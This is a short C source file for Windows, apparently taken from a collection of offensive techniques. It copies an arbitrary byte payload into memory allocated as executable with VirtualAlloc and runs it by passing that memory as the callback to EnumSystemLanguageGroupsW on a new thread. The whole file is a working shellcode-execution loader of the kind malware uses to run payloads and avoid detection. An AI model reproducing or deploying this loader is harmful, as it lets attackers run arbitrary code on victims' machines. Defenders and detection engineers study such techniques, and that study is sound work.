#include "Win32Helper.h"

VOID InvokeEnumSystemLanguageGroupsWThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumSystemLanguageGroupsW((LANGUAGEGROUP_ENUMPROCW)lpParameter, LGRPID_SUPPORTED, NULL);
}

BOOL MpfSceViaEnumSystemLanguageGroupsW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumSystemLanguageGroupsWThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}